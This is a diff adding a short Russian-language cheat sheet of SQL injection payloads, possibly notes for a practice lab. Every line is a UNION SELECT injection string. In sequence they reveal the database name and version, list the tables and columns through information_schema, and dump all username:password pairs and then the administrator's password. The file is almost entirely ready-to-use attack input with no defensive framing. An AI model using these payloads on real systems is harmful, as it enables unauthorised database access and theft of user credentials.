@@ -1,0 +1,16 @@
+Информация о БД
+' UNION SELECT 1,CONCAT('DB: ',database(),' | Version: ',version()),3,4--
+
+Таблица с пользователями
+' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- 
+
+Получение структуры таблицы с пользователями (users)
+' UNION SELECT 1,GROUP_CONCAT(column_name),3,4 FROM information_schema.columns WHERE table_schema=database() AND table_name='users'--
+
+Получение всех пользователей и паролей
+' UNION SELECT 1,GROUP_CONCAT(CONCAT(username,':',password) SEPARATOR '<br>'),3,4 FROM users-- 
+
+Получение пароля Administrator
+' UNION SELECT 1,CONCAT('ID:',id,' User:',username,' Pass:',password),3,4 FROM users WHERE username='administrator'--
+
+ 
